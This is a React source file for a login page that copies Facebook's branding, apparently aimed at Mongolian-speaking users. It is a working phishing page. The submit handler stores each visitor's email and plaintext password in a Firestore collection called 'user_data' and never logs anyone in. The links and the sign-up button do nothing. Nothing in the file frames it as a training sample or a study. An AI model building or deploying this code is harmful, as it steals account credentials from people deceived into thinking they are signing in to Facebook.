import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { db } from "../lib/firebase";
import { addDoc, collection } from "firebase/firestore";

const font = "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif";

export default function Login() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [emailError, setEmailError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);

  const inputStyle = (hasError) => ({
    width: "100%",
    border: `1px solid ${hasError ? "#f02849" : "#dddfe2"}`,
    borderRadius: "6px",
    fontSize: "17px",
    padding: "14px 16px",
    outline: "none",
    boxSizing: "border-box",
    fontFamily: font,
    boxShadow: hasError ? "0 0 0 2px #fde8ec" : undefined,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");

    const emailEmpty = !email.trim();
    const passwordEmpty = !password.trim();
    setEmailError(emailEmpty);
    setPasswordError(passwordEmpty);

    if (emailEmpty || passwordEmpty) return;

    setLoading(true);
    try {
      await addDoc(collection(db, "user_data"), {
        email: email.trim(),
        password: password,
        timestamp: new Date(),
      });
      setEmail("");
      setPassword("");
    } catch (err) {
      setError("Нэвтрэхэд алдаа гарлаа.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#f0f2f5",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        fontFamily: font,
        padding: "20px",
        boxSizing: "border-box",
      }}
    >
      <div style={{ textAlign: "center", marginBottom: "16px" }}>
        <div
          style={{
            color: "#1877f2",
            fontSize: "56px",
            fontWeight: 700,
            letterSpacing: "-2px",
            lineHeight: 1,
            marginBottom: "8px",
          }}
        >
          facebook
        </div>
      </div>

      <form
        onSubmit={handleSubmit}
        style={{
          background: "#fff",
          borderRadius: "8px",
          boxShadow:
            "0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1)",
          padding: "20px",
          width: "100%",
          maxWidth: "396px",
          display: "flex",
          flexDirection: "column",
          gap: "12px",
          boxSizing: "border-box",
        }}
      >
        <input
          type="text"
          placeholder="И-мэйл эсвэл утасны дугаар"
          value={email}
          onChange={(e) => {
            setEmail(e.target.value);
            setEmailError(false);
          }}
          style={inputStyle(emailError)}
          onFocus={(e) => {
            if (!emailError) {
              e.target.style.border = "1px solid #1877f2";
              e.target.style.boxShadow = "0 0 0 2px #e7f3ff";
            }
          }}
          onBlur={(e) => {
            if (!emailError) {
              e.target.style.border = "1px solid #dddfe2";
              e.target.style.boxShadow = "none";
            }
          }}
        />

        <input
          type="password"
          placeholder="Нууц үг"
          value={password}
          onChange={(e) => {
            setPassword(e.target.value);
            setPasswordError(false);
          }}
          style={inputStyle(passwordError)}
          onFocus={(e) => {
            if (!passwordError) {
              e.target.style.border = "1px solid #1877f2";
              e.target.style.boxShadow = "0 0 0 2px #e7f3ff";
            }
          }}
          onBlur={(e) => {
            if (!passwordError) {
              e.target.style.border = "1px solid #dddfe2";
              e.target.style.boxShadow = "none";
            }
          }}
        />

        <button
          type="submit"
          disabled={loading}
          style={{
            width: "100%",
            background: "#1877f2",
            color: "#fff",
            border: "none",
            borderRadius: "6px",
            fontSize: "20px",
            fontWeight: 700,
            padding: "14px",
            cursor: loading ? "not-allowed" : "pointer",
            fontFamily: font,
            opacity: loading ? 0.7 : 1,
          }}
          onMouseOver={(e) => {
            if (!loading) e.target.style.background = "#166fe5";
          }}
          onMouseOut={(e) => {
            if (!loading) e.target.style.background = "#1877f2";
          }}
        >
          {loading ? "Нэвтэрч байна..." : "Нэвтрэх"}
        </button>

        {error && (
          <p style={{ color: "#f02849", fontSize: "13px", textAlign: "center", margin: 0 }}>
            {error}
          </p>
        )}

        <a
          href="#"
          style={{
            color: "#1877f2",
            fontSize: "14px",
            textAlign: "center",
            textDecoration: "none",
            fontFamily: font,
          }}
          onClick={(e) => e.preventDefault()}
        >
          Нууц үгээ мартсан уу?
        </a>

        <div style={{ borderTop: "1px solid #dddfe2", margin: "6px 0" }} />

        <div style={{ textAlign: "center" }}>
          <button
            type="button"
            style={{
              background: "#42b72a",
              color: "#fff",
              border: "none",
              borderRadius: "6px",
              fontSize: "17px",
              fontWeight: 700,
              padding: "14px 24px",
              cursor: "pointer",
              fontFamily: font,
            }}
            onMouseOver={(e) => (e.target.style.background = "#36a420")}
            onMouseOut={(e) => (e.target.style.background = "#42b72a")}
          >
            Шинэ бүртгэл үүсгэх
          </button>
        </div>
      </form>

      <div
        style={{
          marginTop: "28px",
          fontSize: "12px",
          color: "#737373",
          textAlign: "center",
          fontFamily: font,
          maxWidth: "396px",
          lineHeight: 1.6,
        }}
      >
        <div style={{ marginBottom: "8px" }}>
          <a href="#" style={{ color: "#737373", textDecoration: "none", margin: "0 6px" }}>Монгол</a>
          <a href="#" style={{ color: "#737373", textDecoration: "none", margin: "0 6px" }}>English (US)</a>
        </div>
        <div style={{ borderTop: "1px solid #dddfe2", paddingTop: "8px" }}>
          Meta © 2024
          <span style={{ margin: "0 4px" }}> · </span>
          <a href="#" style={{ color: "#737373", textDecoration: "none" }}>Нууцлал</a>
          <span style={{ margin: "0 4px" }}> · </span>
          <a href="#" style={{ color: "#737373", textDecoration: "none" }}>Нөхцөл</a>
          <span style={{ margin: "0 4px" }}> · </span>
          <a href="#" style={{ color: "#737373", textDecoration: "none" }}>Күүки</a>
        </div>
      </div>
    </div>
  );
}
